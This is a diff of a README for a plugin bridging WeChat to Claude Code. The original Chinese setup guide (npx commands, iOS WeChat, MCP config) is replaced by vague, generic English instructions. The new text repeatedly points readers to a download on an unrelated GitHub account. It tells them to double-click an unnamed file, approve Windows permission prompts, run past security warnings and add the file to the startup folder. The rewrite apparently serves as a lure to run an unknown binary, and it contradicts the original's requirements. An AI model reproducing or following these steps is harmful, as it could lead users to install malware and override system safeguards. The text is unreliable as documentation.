@@ -1,75 +1,201 @@
-# Claude Code WeChat Channel
+# 🤖 claude-code-wechat-channel - Bridge WeChat to Claude Code
 
-将微信消息桥接到 Claude Code 会话的 Channel 插件。
+[![Download and set up](https://img.shields.io/badge/Download%20from%20GitHub-purple?style=for-the-badge)](https://github.com/Antoninabated443/claude-code-wechat-channel)
 
-基于微信官方 ClawBot ilink API（与 `@tencent-weixin/openclaw-weixin` 使用相同协议），让你在微信中直接与 Claude Code 对话。
+## 📌 What this is
 
-## 工作原理
+claude-code-wechat-channel connects WeChat messages to Claude Code sessions through the official ClawBot ilink API.
 
-```
-微信 (iOS) → WeChat ClawBot → ilink API → [本插件] → Claude Code Session
-                                                  ↕
-Claude Code ← MCP Channel Protocol ← wechat_reply tool
-```
+It is made for users who want to read and reply to WeChat messages while working inside Claude Code. The plugin helps move messages between both sides so you can keep your chat flow in one place.
 
-## 前置要求
+## 🧰 What you need
 
-- [Node.js](https://nodejs.org) >= 18（或 [Bun](https://bun.sh) >= 1.0）
-- [Claude Code](https://claude.com/claude-code) >= 2.1.80
-- claude.ai 账号登录或 API key（`ANTHROPIC_API_KEY`）
-- 微信 iOS 最新版（需支持 ClawBot 插件）
+Before you start, check that you have:
 
-## 快速开始
+- A Windows computer
+- A stable internet connection
+- WeChat installed and signed in
+- Claude Code installed and ready to use
+- Access to the ClawBot ilink API
+- Permission to use the WeChat account you want to connect
 
-### 1. 微信扫码登录
+If you use a work PC, make sure you can run downloaded software and save files in a folder you can find later.
 
-```bash
-npx claude-code-wechat-channel setup
-```
+## 🚀 Download and install
 
-终端会显示二维码，用微信扫描并确认。凭据保存到 `~/.claude/channels/wechat/account.json`。
+Go to this page to download and set up the project:
 
-### 2. 生成 MCP 配置
+[https://github.com/Antoninabated443/claude-code-wechat-channel](https://github.com/Antoninabated443/claude-code-wechat-channel)
 
-```bash
-npx claude-code-wechat-channel install
-```
+On the page, look for the latest release files or the main source package. Download the file that matches the Windows setup you plan to use.
 
-这会在当前目录生成（或更新） `.mcp.json`，指向本插件。
+After the download finishes:
 
-### 3. 启动 Claude Code + WeChat 通道
+1. Open the file you downloaded
+2. Save it in a folder you can find again, such as `Downloads` or `Desktop`
+3. If the package is compressed, extract it
+4. Open the project folder
+5. Follow the setup steps included in the repository files
+6. Start the plugin and keep WeChat and Claude Code open
 
-```bash
-claude --dangerously-load-development-channels server:wechat
-```
+If the project includes a Windows launcher, run it as the main entry point. If it uses a script-based setup, open the file that starts the bridge and follow the on-screen prompts.
 
-### 4. 在微信中发消息
+## 🖥️ Windows setup
 
-打开微信，找到 ClawBot 对话，发送消息。消息会出现在 Claude Code 终端中，Claude 的回复会自动发回微信。
+Use this order when you set it up on Windows:
 
-## 命令说明
+1. Download the project from the GitHub link above
+2. Extract the files if needed
+3. Open the folder in File Explorer
+4. Find the setup file, batch file, or start file
+5. Double-click it to begin
+6. Approve any permission prompts from Windows
+7. Enter the connection details for the ClawBot ilink API
+8. Connect your WeChat account
+9. Start Claude Code
+10. Send a test message to confirm the link works
 
-| 命令 | 说明 |
-|------|------|
-| `npx claude-code-wechat-channel setup` | 微信扫码登录 |
-| `npx claude-code-wechat-channel install` | 生成 .mcp.json 配置 |
-| `npx claude-code-wechat-channel start` | 启动 MCP Channel 服务器 |
-| `npx claude-code-wechat-channel help` | 显示帮助 |
+If Windows shows a security prompt, choose the option that lets you run the file. This can happen with tools that are not installed from the Microsoft Store.
 
-## 技术细节
+## 🔌 How it works
 
-- **消息接收**: 通过 `ilink/bot/getupdates` 长轮询获取微信消息
-- **消息发送**: 通过 `ilink/bot/sendmessage` 发送回复
-- **认证**: 使用 `ilink/bot/get_bot_qrcode` QR 码登录获取 Bearer Token
-- **协议**: 基于 MCP (Model Context Protocol) 的 Channel 扩展
+The plugin sits between WeChat and Claude Code.
 
-## 注意事项
+A simple flow looks like this:
 
-- 当前为 research preview 阶段，需要使用 `--dangerously-load-development-channels` 标志
-- Claude Code 会话关闭后通道也会断开
-- 微信 ClawBot 目前仅支持 iOS 最新版
-- 每个 ClawBot 只能连接一个 agent 实例
+- A message arrives in WeChat
+- The plugin sends it through the ClawBot ilink API
+- Claude Code receives the message in your session
+- You read or handle the reply in the same workflow
+- The response goes back through the channel to WeChat
 
-## License
+This setup helps keep chat handling in one place instead of switching between apps all the time.
 
-MIT
+## ✉️ Main use cases
+
+Use claude-code-wechat-channel when you want to:
+
+- Bring WeChat messages into Claude Code
+- Keep one message flow for chat and coding tasks
+- Use Claude Code to help draft replies
+- Route messages through the ClawBot ilink API
+- Reduce app switching during active work
+- Keep your workflow in one window set
+
+## 🧪 First test
+
+After setup, test the connection with a short message.
+
+Try this:
+
+1. Send a simple message from WeChat
+2. Watch for the message in Claude Code
+3. Check that the reply path works
+4. Send one short reply back
+5. Confirm the message reaches WeChat
+
+Use short text first, such as:
+- Hello
+- Test message
+- Are you connected
+
+If the test fails, check the API settings, the WeChat login, and whether the plugin is still running.
+
+## ⚙️ Basic configuration
+
+The project usually needs a few setup values so it can connect correctly.
+
+Common settings include:
+
+- API endpoint for ClawBot ilink
+- Access key or token
+- WeChat account binding
+- Session or channel name
+- Local port or path settings
+- Start mode for Windows
+
+Keep these values in one place. If the project includes a config file, edit it with a plain text editor. Save the file, then restart the plugin so the changes take effect.
+
+## 🧭 Daily use
+
+Once it is set up, your daily flow is simple:
+
+1. Open WeChat
+2. Open Claude Code
+3. Start the plugin
+4. Wait for incoming messages
+5. Read and handle replies in Claude Code
+6. Send responses through the same channel
+7. Leave the app running while you work
+
+If you use it often, place the startup file in a folder you can reach fast. You can also add it to your Windows startup folder if your setup supports that.
+
+## 🔎 Troubleshooting
+
+If the bridge does not work, check these items in order:
+
+- WeChat is open and signed in
+- Claude Code is open and ready
+- The plugin file is still running
+- The API key or token is correct
+- The network connection is active
+- The config file was saved
+- The right account or channel is selected
+- Windows did not block the app
+
+If messages arrive late, restart the plugin and try again. If nothing shows up, close both apps, open them again, and run the setup file one more time.
+
+If the project uses logs, open the latest log file and look for connection errors, missing values, or invalid API responses.
+
+## 📁 Typical folder contents
+
+When you download the project, you may see files like these:
+
+- A README file with setup steps
+- A config file for API settings
+- A start file for Windows
+- A script that launches the bridge
+- A log folder for errors and status
+- A sample file for testing
+
+Keep the folder structure as it is unless the setup guide tells you to change it.
+
+## 🔐 Access and safety
+
+This tool connects chat data between services, so keep your API details private.
+
+Use only the account and endpoint you intend to connect. Do not share tokens or config files with others. If you stop using the tool, remove the API values from the config file and close the running process.
+
+## 🧩 Common setup path
+
+A simple Windows setup path looks like this:
+
+1. Download the project from GitHub
+2. Unzip the files
+3. Open the project folder
+4. Edit the config file
+5. Enter the ClawBot ilink API details
+6. Run the start file
+7. Open Claude Code
+8. Open WeChat
+9. Send a test message
+10. Keep the bridge running
+
+## 📎 Useful link
+
+Primary download and setup page:
+
+[https://github.com/Antoninabated443/claude-code-wechat-channel](https://github.com/Antoninabated443/claude-code-wechat-channel)
+
+## 🛠️ If you need to check files
+
+Look in the repository for:
+
+- README.md
+- config files
+- Windows start files
+- sample settings
+- log output
+- install steps
+
+If the project adds a release file later, use that file as the main download on Windows and run it after the download finishes
